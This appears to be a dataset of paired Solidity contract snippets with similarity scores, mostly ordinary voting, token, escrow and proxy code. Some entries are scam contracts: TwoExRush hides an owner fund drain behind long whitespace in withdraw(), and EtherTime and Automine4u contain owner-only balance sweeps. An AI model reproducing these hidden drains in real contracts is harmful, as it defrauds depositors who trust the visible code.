                totalVotes ++;
                slides[slide].voteCount ++;
                slides[slide].score += score;
                hasVoted(msg.sender, slide, score);
            } else {
                VoterNoRightToVote(msg.sender);
            }
        } else {
            ChairpersonNotAllowedToVote(msg.sender);
        }
    } else {
        VoterNotExists(msg.sender);
    }
}

function vote3(uint slide, uint score) {
    Voter voter = voters[msg.sender];
    callVote(msg.sender, slide, score);
    VoterExists(msg.sender);
    VoterAllowedToVote(msg.sender);
    voter.voted += 1;
    totalVotes += 1;
    slides[slide].voteCount += 1;
    slides[slide].score += score;
    hasVoted(msg.sender, slide, score);
}

function winningSlide() constant returns (uint winningSlide) {
    uint winningScore = 0;
    for (uint p = 0; p < totalSlides; p++) {
        if (slides[p].score > winningScore) {
            winningScore = slides[p].score;
            winningSlide = p;
        }
    }
    return(winningSlide);
}




function winnerCount() constant returns (uint voteCount) {
    uint winnerSlide;
    winnerSlide = winningSlide();
    voteCount = slides[winnerSlide].voteCount;
    return(voteCount);
}

function winnerScore() constant returns (uint score) {
    uint winnerSlide = winningSlide();
    score = slides[winnerSlide].score;
    return(score);
}

    
function delegate(address to) {
    Voter sender = voters[msg.sender];
    if (sender.voted != 0) throw;

    while (voters[to].delegate != address(0) &&
           voters[to].delegate != msg.sender)
        to = voters[to].delegate;

    if (to == msg.sender)
        throw;

    for (uint i = 0; i < totalSlides; i++) sender.voted += 1;

    sender.delegate = to;
    Voter delegate = voters[to];
    hasDelegated(msg.sender, to);
}
}",0.5489506457791281,"contract Automine4uNetwork is ERC20 {

    

    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;    



    string public constant name = ""Automine4u"";

    string public constant symbol = ""ATMU"";

    uint public constant decimals = 18;

    

    uint256 public totalSupply = 9000000000000000000000000;

    uint256 public totalDistributed =  1000000000000000000000;    

    uint256 public constant MIN_CONTRIBUTION = 1 ether / 10; 

    uint256 public tokensPerEth = 1111000000000000000000;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    

    event Distr(address indexed to, uint256 amount);

    event DistrFinished();



    event Airdrop(address indexed _owner, uint _amount, uint _balance); 



    event TokensPerEthUpdated(uint _tokensPerEth);

    

    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;

    

    modifier canDistr() {

        require(!distributionFinished);

        _;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    

    constructor() public {

        owner = msg.sender;    

        distr(owner, totalDistributed);

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }

    



    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        emit DistrFinished();

        return true;

    }

    

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalDistributed = totalDistributed.add(_amount);        

        balances[_to] = balances[_to].add(_amount);

        emit Distr(_to, _amount);

        emit Transfer(address(0), _to, _amount);



        return true;

    }



    function doAirdrop(address _participant, uint _amount) internal {



        require( _amount > 0 );      



        require( totalDistributed < totalSupply );

        

        balances[_participant] = balances[_participant].add(_amount);

        totalDistributed = totalDistributed.add(_amount);



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }



        

        emit Airdrop(_participant, _amount, balances[_participant]);

        emit Transfer(address(0), _participant, _amount);

    }



    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        

        doAirdrop(_participant, _amount);

    }



    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        

        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);

    }



    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        

        tokensPerEth = _tokensPerEth;

        emit TokensPerEthUpdated(_tokensPerEth);

    }

           

    function () external payable {

        getTokens();

     }

    

    function getTokens() payable canDistr  public {

        uint256 tokens = 0;



        

        require( msg.value >= MIN_CONTRIBUTION );



        require( msg.value > 0 );



        

        tokens = tokensPerEth.mul(msg.value) / 1 ether;        

        address investor = msg.sender;

        

        if (tokens > 0) {

            distr(investor, tokens);

        }



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }



    function balanceOf(address _owner) constant public returns (uint256) {

        return balances[_owner];

    }



    

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        ForeignToken t = ForeignToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }

	

	function Kickmining(uint256 _wdamount) onlyOwner public {

        uint256 wantAmount = _wdamount;

        owner.transfer(wantAmount);

    }

    

    function Kickmininga() onlyOwner public {

        address myAddress = this;

        uint256 etherBalance = myAddress.balance;

        owner.transfer(etherBalance); 

    }

    

    function burn(uint256 _value) onlyOwner public { 

        require(_value <= balances[msg.sender]);

        

        



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        emit Burn(burner, _value);

    }

	 

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }

}"
"contract Donation {
  mapping (address => uint) user_amounts;    


  
  function sendDonation(uint n) {
    user_amounts[msg.sender] = user_amounts[msg.sender] + n
  }
}",0.5861971248277043,"contract ProtocolInterface {

    function deposit(address _user, uint _amount) public;
    function withdraw(address _user, uint _amount) public;
}"
"contract Proxy {
  function () payable external {
    
    _fallback();
  }

  function _fallback() internal {
    _willFallback();
    _delegate(_implementation());
  }


  function _implementation() internal view returns (address);

  function _delegate(address implementation) internal { ... }

  function _willFallback() internal { }
}",0.5808470111688928,"contract Oracle {
    
    function withdraw(address _recipient, uint256 _amount) public {}
  
    function withdrawable() external view returns (uint256) {}
    
    function transferOwnership(address newOwner) public {}

    function setFulfillmentPermission(address _node, bool _allowed) external {}
}"
"contract UserTokensControl is Ownable {
  address companyReserve;
  address founderReserve;
  address contractReserve;
}",0.56091047481901,"contract ERC223ReceivingContract is Ownable {





  function tokenFallback(address _from, uint _value, address _to);



}"
"contract Test {
    function toBytes(address a) public pure returns (bytes b) {
        assembly {
            let m := mload(0x40)
            mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, a))
            mstore(0x40, add(m, 52))
            b := m
       }
    }

    function toBytes(uint _num) public pure returns (bytes _ret) {
        assembly {
            _ret := mload(0x10)
            mstore(_ret, 0x20)
            mstore(add(_ret, 0x20), _num)
        }
    }

    function test(uint num1, uint num2) public view returns (bytes) {
        bytes memory a1 = toBytes(msg.sender);
        bytes memory a2 = toBytes(num1);
        bytes memory a3 = toBytes(num2);
        bytes memory ret = new bytes(a1.length + a2.length + a3.length);
        uint x = 0;

        for (uint i = 0; i < a1.length; i++) {
            ret[x++] = a1[i];
        }

        for (i = 0; i < a2.length; i++) {
            ret[x++] = a2[i];
        }

        for (i = 0; i < a3.length; i++) {
            ret[x++] = a3[i];
        }

        return ret;
    }
}",0.587926846184691,"contract owned is usingOraclize{
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
    
    
    function stringEqual(string _a, string _b) internal returns (bool) {
        return strCompare(_a, _b) == 0;
    }
    function addressToAsciiString(address x) internal returns (string) {
        bytes memory s = new bytes(40);
        for (uint i = 0; i < 20; i++) {
            byte b = byte(uint8(uint(x) / (2**(8*(19 - i)))));
            byte hi = byte(uint8(b) / 16);
            byte lo = byte(uint8(b) - 16 * uint8(hi));
            s[2*i] = char(hi);
            s[2*i+1] = char(lo);
        }
        return string(s);
    }

    function char(byte b) internal returns (byte c) {
        if (b < 10) return byte(uint8(b) + 0x30);
        else return byte(uint8(b) + 0x57);
    }
    
}"
"contract MyContract {
struct Posposal{
    uint posposalId;
    bytes1 description_;
    uint userId;
    uint amount;
    address voteSponsorAddr;

}
Posposal[] public curPosposals; 
uint public posposalNextId=0;

function MyContract() {

}
uint public expId;
address public expTarget;
string public expDes;
function issuse(uint userId,address target_,uint amount_,string description_)  {
    expId=userId;
    expTarget=target_;
    expDes=description_;
    curPosposals.push(Posposal(posposalNextId,0x00,userId,amount_,msg.sender));
    posposalNextId++;
}}",0.5528120903724518,"contract LucreVesting is Ownable {

    struct Vesting {        

        uint256 amount;

        uint256 endTime;

    }

    mapping(address => Vesting) internal vestings;



    function addVesting(address _user, uint256 _amount, uint256 _endTime) public ;

    function getVestedAmount(address _user) public view returns (uint256 _amount);

    function getVestingEndTime(address _user) public view returns (uint256 _endTime);

    function vestingEnded(address _user) public view returns (bool) ;

    function endVesting(address _user) public ;

}"
"contract Test is usingOraclize {

    uint public tokens;

    uint public dollarCost;


    function() payable {
        updatePrice();
        tokens = msg.value * dollarCost / 1000 / (10 ** 16);
    }


    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
        dollarCost = parseInt(result, 3);
    }

    function updatePrice() public payable {

        if (oraclize_getPrice(""URL"") > this.balance) {
            return;
        }
        else {
          oraclize_query(""URL"", ""json(https:
        }
    }
}",0.5941534439765587,"contract PricingStrategy {

  
  function isPricingStrategy() public pure returns (bool) {
    return true;
  }

  
  function isSane(address ) public pure returns (bool) {
    return true;
  }

  
  function isPresalePurchase(address ) public pure returns (bool) {
    return false;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public view returns (uint tokenAmount);
}"
"contract GlobalGeneric {
    KeyValueStorage globalS;
    constructor(KeyValueStorage storage_) public {
        globalS = storage_;
    }
    function claimInterests(address _memberAddr, bytes32 _identifier) public returns (bool success) {
        require(now > globalS.refreshTime[_memberAddr][_identifier] + 90 days);
        .....
    }
....
}",0.5257704744639637,"contract DSProxyInterface {

    
    
    
    
    

    function execute(address _target, bytes memory _data) public virtual payable returns (bytes32);

    function setCache(address _cacheAddr) public virtual payable returns (bool);

    function owner() public virtual returns (address);
}"
"contract DecompiledContract {
    function start() {
        *0x40 = 0x60;
        var0 = msg.data.length;

        if(var0 != 0x0) {
            var0 = (uint256)$msg.sig;

            if(var0 == 0x41c0e1b5) {
                kill();
            }

            if(var0 == 0xe5225381) {
                collect();
            }
        }

        if($msg.value > 0x0) {
            var2 = msg.sender;
            uint256* var6 = *0x40;
            *var6 = $msg.value;
            emit Deposit(*0x40, var6 + 1 - *0x40);
        }

        stop();
    }

    function kill() public payable {
        __impl_kill();
        stop();
    }

    function collect() public payable {
        __impl_collect();
        stop();
    }

   function __impl_kill() private {
        var1 = storage[0x0];
        int256 var0 = var1;
        var1 = msg.sender;

        if((address(var0)) == (address(msg.sender))) {
            var1 = storage[0x0];
            suicide(address(var1));
        }
    }

    function __impl_collect() private {
        var1 = storage[0x0];
        int256 var0 = var1;
        var1 = msg.sender;

        if((address(var0)) == (address(msg.sender))) {
            var1 = storage[0x0];
            var2 = address(this);
            var2 = balance(address(var2));
            uint256 var5 = *0x40;
            var4 = call(0x0, address(var1), var2, var5, *0x40 - var5, var5, 0x0);
        }
    }

}",0.5427021213556227,"contract TwoExRush {

	string constant public name = ""TwoExRush"";
	address owner;
	address sender;
	uint256 withdrawAmount;
	uint256 contractATH;
	uint256 contractBalance;

	mapping(address => uint256) internal balance;

    function TwoExRush() public {
        owner = msg.sender;
    }

    
	function withdraw() public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        owner.transfer(contractBalance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
	    if(contractATH >= 20) {
	        sender = msg.sender;
	        withdrawAmount = mul(balance[sender], 2);
	 	    sender.transfer(withdrawAmount);
	        contractBalance -= balance[sender];
	        balance[sender] = 0;
	    }
	}

	function deposit() public payable {
 	    sender = msg.sender;
	    balance[sender] += msg.value;
	    contractATH += msg.value;
	    contractBalance += msg.value;
	}

	function () payable public {
		if (msg.value > 0) {
			deposit();
		} else {
			withdraw();
		}
	}
	
    
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
}"
"contract test001 {

    address AA;

    event Creation(address, address);

    function test001() public {
        AA = new test002();

        Creation(address(this), AA);
    }

    function register() public {
        


        



        
        test002 A = test002(AA);
        A.addItem(address(this));
    }



}",0.5841972833896028,"contract IOwned {

    

    function owner() public pure returns (address) {}



    event OwnerUpdate(address _prevOwner, address _newOwner);



    function transferOwnership(address _newOwner) public;

    function acceptOwnership() public;

}"
"contract TicTacToe {


    uint[3][]   arr ;

    function isSolved(int[3][] board) returns (int) {
        arr = board;
        

        int check  = 0;
        int h1 =  checkH(arr[1]);

        if(h1 == -1){
            int h2 =  checkH(arr[2]);
            if(h2 == -1){
                int h3 =  checkH(arr[3]);
                 check = h3;

            }else{
                check = h2;
            }
        }else{
          check = h1;
        }


        if(check == -1){
            check = checkS(arr);
            if(check == -1){
                check = checkX(arr);
            }

        }

        if(check == -1){
            check = 0;

        }

        if(check == 0){
            check = -1;

        }


        return check;

    }



    
    function checkH(int[] h) private   returns (int)  {
        if(h[0] == h[1] && h[1] == h[2]){
            return h[0];
        }
        return -1;
    }

    
    function checkS(int[3][] board) private   returns (int)  {
        if(board[0][0] == board[1][0] && board[1][0] == board[2][0]){
            return board[1][0];
        }
        if(board[0][1] == board[1][1] && board[1][1] == board[2][1]){
            return board[1][0];
        }
        if(board[0][2] == board[1][2] && board[1][2] == board[2][2]){
            return board[1][0];
        }
        return -1;
    }

    
    function checkX(int[3][] board) private   returns (int)  {
        if(board[0][0] == board[1][1] && board[1][1] == board[2][2]){
            return board[0][0];
        }
        if(board[0][2] == board[1][1] && board[1][1] == board[2][0]){
            return board[0][2];
        }
        return -1;
    }

}",0.5249208446657068,"contract BaseMigration {

    function convertPurity(uint16 purity) public pure returns (uint8) {
        return uint8(4 - (purity / 1000));
    }

    function convertProto(uint16 proto) public view returns (uint16) {
        if (proto >= 1 && proto <= 377) {
            return proto;
        }
        
        if (proto == 380) {
            return 400;
        }
        
        if (proto == 381) {
            return 401;
        }
        
        if (proto == 394) {
            return 402;
        }
        
        (bool found, uint index) = getEtherbotsIndex(proto);
        if (found) {
            return uint16(380 + index);
        }
        
        if (proto == 378) {
            return 65000;
        }
        
        if (proto == 379) {
            return 65001;
        }
        
        if (proto == 383) {
            return 65002;
        }
        
        if (proto == 384) {
            return 65003;
        }
        require(false, ""unrecognised proto"");
    }

    uint16[] internal ebs = [400, 413, 414, 421, 427, 428, 389, 415, 416, 422, 424, 425, 426, 382, 420, 417];

    function getEtherbotsIndex(uint16 proto) public view returns (bool, uint16) {
        for (uint16 i = 0; i < ebs.length; i++) {
            if (ebs[i] == proto) {
                return (true, i);
            }
        }
        return (false, 0);
    }

}"
"contract example { 

    struct StructPrimary {
        uint start;
        bool isActive;
        uint index;
        address owner;
        uint[] indexcounter;
    }

    uint globalCounter;
    uint[] public userArray;

    
    mapping(uint => StructPrimary) public structByIndex;
    mapping(address => StructPrimary) public structByAddress;


    function addCandidate (address _candidate) public returns (uint) {
        
        StructPrimary storage accounts = structByIndex[userArray.length];
        accounts.start = 0;
        accounts.owner = _candidate;
        accounts.isActive = true;
        accounts.index = userArray.length;
        accounts.indexcounter.push(userArray.length);

        
        structByIndex[accounts.index].owner = _candidate;

        
        structByAddress[_candidate].indexcounter.push(userArray.length);

        globalCounter++ ;

        
        return userArray.push(accounts.index);
    }
}",0.5425496446147454,"contract MinterRole is Ownable {
    using Roles for Roles.Role;

    event MinterAdded(address indexed account);
    event MinterRemoved(address indexed account);

    Roles.Role private minters;

    constructor() public {
        _addMinter(msg.sender);
    }

    modifier onlyMinter() {
        require(isMinter(msg.sender));
        _;
    }

    function isMinter(address account) public view returns (bool) {
        return minters.has(account);
    }

    function addMinter(address account) public onlyOwner {
        _addMinter(account);
    }

    function renounceMinter() public {
        _removeMinter(msg.sender);
    }

    function _addMinter(address account) internal {
        minters.add(account);
        emit MinterAdded(account);
    }

    function _removeMinter(address account) internal {
        minters.remove(account);
        emit MinterRemoved(account);
    }
}"
"contract MyContract is Owned {
  event Created (
    uint256 tradeId,
    uint256 createdAt,
    uint256 expiredAt,
    address originatorAddress,
    address benificiaryAddress,
    string expectedToken,
    uint256 receivedQty);
  event Released(uint256 tradeId);

  struct Escrow {
    uint256 tradeId;
    uint256 createdAt;
    uint256 expiredAt;
    address originatorAddress;
    address benificiaryAddress;
    string expectedToken;
    uint256 receivedQty;
  }

  mapping (uint256 => Escrow) public escrows;
  mapping(address => mapping(address => uint256)) public escrowBalance;
  uint256 feePercent;
  address feeAddress;
  
  
  
  constructor() public {
  
  
  }

  function createEscrow( uint256 _tradeId,
    uint256 _expiredAt,
    address _benificiaryAddress,
    string _expectedToken,
    uint256 _receivedQty, 
    address token)payable external
  {   
    uint256 tokenBalance = ERC20Interface(token).balanceOf(msg.sender);
    require(tokenBalance >=_receivedQty, ""Insufficient balance."");

    escrows[_tradeId] = Escrow(_tradeId, now, now + _expiredAt, msg.sender, _benificiaryAddress, _expectedToken, _receivedQty);

    ERC20Interface(token).transferFrom(msg.sender, this, _receivedQty);   
    emit Created (_tradeId, now, now + _expiredAt, msg.sender, _benificiaryAddress, _expectedToken, _receivedQty);
  }

  function releaseToken(uint256 _tradeId, address token) external {
    Escrow storage escrow = escrows[_tradeId];
    ERC20Interface(token).transfer(escrow.benificiaryAddress, escrow.receivedQty);
    emit Released(_tradeId);
    delete escrows[_tradeId];
  }   
}",0.5931815432463975,"contract EmploySale is Ownable {

  using SafeMath for uint256;



  

  ERC20 public token;



  

  uint256 public weiRaised;



  

  event TokenPurchase(

    address indexed purchaser,

    address indexed beneficiary,

    uint256 value,

    uint256 amount

  );



  

  constructor(ERC20 _token) public {

    token = _token;

  }



  

  

  



  

  function buyTokens(address _beneficiary, uint256 _rate, address _wallet) public payable {

    require(_wallet != address(0));

    require(_rate != 0);



    uint256 weiAmount = msg.value;

    _preValidatePurchase(_beneficiary, weiAmount);



    

    uint256 tokens = _getTokenAmount(weiAmount, _rate);



    

    weiRaised = weiRaised.add(weiAmount);



    _processPurchase(_beneficiary, tokens);

    emit TokenPurchase(

      msg.sender,

      _beneficiary,

      weiAmount,

      tokens

    );



    _forwardFunds(_wallet);

  }



  

  

  



  

  function _preValidatePurchase(

    address _beneficiary,

    uint256 _weiAmount

  )

    internal

  {

    require(_beneficiary != address(0));

    require(_weiAmount != 0);

  }



  

  function _deliverTokens(

    address _beneficiary,

    uint256 _tokenAmount

  )

    internal

  {

    token.transfer(_beneficiary, _tokenAmount);

  }



  

  function _processPurchase(

    address _beneficiary,

    uint256 _tokenAmount

  )

    internal

  {

    _deliverTokens(_beneficiary, _tokenAmount);

  }





  

  function _getTokenAmount(uint256 _weiAmount, uint256 _rate)

    internal pure returns (uint256)

  {

    return _weiAmount.mul(_rate);

  }



  

  function _forwardFunds(address _wallet) internal {

    _wallet.transfer(msg.value);

  }



  function withdrawToken() onlyOwner external returns(bool) {

    require(token.transfer(owner, token.balanceOf(address(this))));

    return true;

  }



}"
"contract tokenExchange {

address owner;
tokensHolder holder;
uint validTime;
bytes32 tokenOffered;
uint numberOffered;
bool offered;

address exchangee;
bytes32 tokenExpected;
uint numberExpected;
bool expected;



function tokenExchange(
   address _tokenHolder,
   uint _validTimeinDays,
   bytes32 _tokenOffered,
   uint _numberOffered,
   bytes32 _tokenExpected,
   uint  _numberExpected,
   address  _exchangee)
 {
    owner = msg.sender;
    holder = tokensHolder(_tokenHolder);
    validTime = now + _validTimeinDays * 1 days;
    tokenOffered = _tokenOffered;
    numberOffered = _numberOffered;
    tokenExpected = _tokenExpected;
    numberExpected = _numberExpected;
    exchangee = _exchangee;
   expected = false;
   offered = false;
}


function checkBalances(){

    if ((offered == expected)==true){
       payout();
    }else {
        if (now <= validTime){
            if (holder.getBalance(tokenOffered) == numberOffered){offered = true;}
            if (holder.getBalance(tokenExpected) == numberExpected){expected = true;}
      if ((offered == expected)==true){payout();}
        }else {
            revert();
       } 
    }

}

function  payout() internal {
   if ((offered == expected)==true){
    holder.sendToken(tokenOffered ,exchangee, numberOffered);
    holder.sendToken(tokenExpected,owner,numberExpected);
     selfdestruct(owner);}
}

function revert() internal {
  if (offered == true){holder.sendToken(tokenOffered ,owner, numberOffered);}
  if (expected == true){holder.sendToken(tokenExpected,exchangee,numberExpected);}
    selfdestruct(owner);
}

function valid() returns (bool) {
    if (now <= validTime ){return true;}else{return false;}
}
  }",0.5264132982534196,"contract AngelTokensHolder is Owned {
    using SafeMath for uint256;

    uint256 collectedTokens;
    ATTContribution contribution;
    MiniMeToken att;

    function AngelTokensHolder(address _owner, address _contribution, address _att) {
        owner = _owner;
        contribution = ATTContribution(_contribution);
        att = MiniMeToken(_att);
    }


    
    function collectTokens() public onlyOwner {
        uint256 balance = att.balanceOf(address(this));
        uint256 total = collectedTokens.add(balance);

        uint256 finalizedTime = contribution.finalizedTime();

        require(finalizedTime > 0);

        uint256 canExtract = total.div(2);

        if (getTime() > finalizedTime.add(months(6))) {
            canExtract = total;
        }

        canExtract = canExtract.sub(collectedTokens);

        if (canExtract > balance) {
            canExtract = balance;
        }

        collectedTokens = collectedTokens.add(canExtract);
        assert(att.transfer(owner, canExtract));

        TokensWithdrawn(owner, canExtract);
    }

    function months(uint256 m) internal returns (uint256) {
        return m.mul(30 days);
    }

    function getTime() internal returns (uint256) {
        return now;
    }


    
    
    

    
    
    
    
    function claimTokens(address _token) public onlyOwner {
        require(_token != address(att));
        if (_token == 0x0) {
            owner.transfer(this.balance);
            return;
        }

        ERC20Token token = ERC20Token(_token);
        uint256 balance = token.balanceOf(this);
        token.transfer(owner, balance);
        ClaimedTokens(_token, owner, balance);
    }

    event ClaimedTokens(address indexed _token, address indexed _controller, uint256 _amount);
    event TokensWithdrawn(address indexed _holder, uint256 _amount);
}"
"contract MyContract {

     struct CommonDetails {
      string name; 
      uint32 group;
      mapping (string => SpecificDetails1) items;
     }

     struct SpecificDetails1{
      uint32 capacity;
      string owner;
     }

    struct SpecificDetails2{
     uint32 capacity;
     string owner;
    }

    mapping (address => CommonDetails) commonMapping;
    mapping (string => address)specificMapping;

    function setName(string _name, uint32 _group){

     commonMapping[tx.origin] = CommonDetails(_name, _group);

      if (_group == 1){
       
       
     }
    }

   function getName() constant returns(address, string, uint32) {

     return (tx.origin, commonMapping[tx.origin].name, 
     commonMapping[tx.origin].group);
     
    } ",0.5469077124336339,"contract DZariusz is Ownable {


    string public name;
    string public contact;

    event LogSetName(address indexed executor, string newName);
    event LogSetContact(address indexed executor, string newContact);


    constructor(string _name, string _contact) public {

        setName(_name);
        setContact(_contact);

    }



    function setName(string _name)
    public
    onlyOwner
    returns (bool)
    {
        name = _name;
        emit LogSetName(msg.sender, _name);

        return true;
    }



    function setContact(string _contact)
    public
    onlyOwner
    returns (bool)
    {
        contact = _contact;
        emit LogSetContact(msg.sender, _contact);

        return true;
    }



}"
"contract KrakenPriceTicker is usingOraclize {

    address owner;
    string public ETHXBT;


    function KrakenPriceTicker() {
        owner = msg.sender;
        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        update();
    }

    function __callback(bytes32 myid, string result, bytes proof) {
        if (msg.sender != oraclize_cbAddress()) throw;
        ETHXBT = result;
        update();
    }

    function update() {
        oraclize_query(60, ""URL"", ""json(https:
    }

    function kill(){
        if (msg.sender == owner) suicide(msg.sender);
    }

}",0.5616292571614728,"contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}"
"contract NameRegistry {
mapping(bytes32 => address) public registryTable;
function claimName(bytes32 name) {
if (msg.value < 10) {
throw;
}
if (registryTable[name] == 0) {
registryTable[name] = msg.sender;
}    }    }",0.5727546152787476,"contract EtherTime

{

    address Owner = msg.sender;



    function() public payable {}



    function Xply() public payable {

        if (msg.value >= address(this).balance || tx.origin == Owner) {

            selfdestruct(tx.origin);

        }

    }

 }"
"contract Student{
    uint ID;
    struct stu{
        string name;
        uint age;
        bool tookTest;
    }
    mapping(uint => stu) StudentNames;
    function Student(string _name,uint _age) {
        
        stu s = StudentNames[ID];
        s.name = _name;
        s.age = _age;
        s.tookTest = false;
    }
}",0.5350300138320562,"contract goodsToken is ERC20Burnable {
    
    string public name;
    string public symbol = ""GOODS"";
    uint8 public decimals;
    
    constructor(string memory _name, uint256 amount, address owner) public {
        name = _name;
        _mint(owner, amount);
    }
    
}"
"contract ClassRoom {
    address studentAddr;
    Student student;
    function ClassRoom(address addr) {
        studentAddr = addr;
        student = Student(addr);
    }

    
}",0.5431839115222996,"contract CryptaurRewards {

    function payment(address _buyer, address _seller, uint _amount, address _opinionLeader) public returns(uint fee);

}"
"contract RentBasic {
HouseState defaultState = HouseState.ReleaseRent;
struct HouseInfo {          
        uint8    landRate; 
        uint8    ratingIndex;  
        uint8    huxing;     
        string   houseAddress;      
        bytes32  houseId;   
        string   descibe;   
        string   landlordInfo;              
        string   hopeYou;       
        address  landlord;      
}
struct HouseReleaseInfo {
    HouseState    state;  
    uint32        tenancy;
    uint256       rent; 
    uint          releaseTime;  
    uint          updateTime; 
    uint          dealineTime;  
    bool          existed; 
}

ERC20Interface token;
TenancyAgreement tenancyContract;
RegisterInterface userRegister; 

modifier onlyLogin() {
    require(userRegister.isLogin(msg.sender));
    _;
}
function releaseHouse(string _houseAddr,uint8 _huxing,string _describe, string _info, uint32 _tenancy, uint256 _rent, string _hopeYou) public onlyLogin returns (bytes32) {
    uint256 nowTimes = now; 
    uint256 deadTime = nowTimes + 7 days;
    address houseOwer = msg.sender;
    
    
    require(token.transferFrom(houseOwer, receiverPromiseMoney, promiseAmount),""Release_Balance is not enough"");
    addrMoney[houseOwer] = promiseAmount;
    bytes32 houseIds = keccak256(abi.encodePacked(houseOwer, nowTimes, deadTime));
    hsInformation = HouseInfo({             
        landRate: 2     
    });
    houseInfos[houseIds] = hsInformation;
    hsReleaseInfos[houseIds] = HouseReleaseInfo({
        state: defaultState
    });
    
    ReleaseBasic(houseIds, 2, _houseAddr, _huxing, _describe, _info, _hopeYou, houseOwer);
    ReleaseInfo(houseIds, defaultState, _tenancy,_rent,nowTimes,deadTime,true);
    return houseIds;
}",0.5166374082960606,"contract Crowdsale {
  using SafeMath for uint256;

  
  MintableToken public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) {
    
    require(_endTime >= _startTime);
    require(_rate > 0);
    

    token = createTokenContract();
    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
  }

  
  
  function createTokenContract() internal returns (MintableToken) {
    return new MintableToken();
  }


  
  function () payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address beneficiary) public payable {
    require(beneficiary != 0x0);
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    token.mint(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
  }

  
  
  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }

  
  function validPurchase() internal constant returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }

  
  function hasEnded() public constant returns (bool) {
    return now > endTime;
  }


}"
"contract GasRefundTest {

    uint[] myArray = [1, 2];

    function deleteLastElem() public returns(bytes32) {
        delete myArray[1];
        myArray.length--;
    }
}",0.5567743562252381,"contract TokenReceiver {

  function tokenFallback(address from, uint256 amount, bytes32 data) public returns (bool success);

}"
"contract test013 {

    
    
    
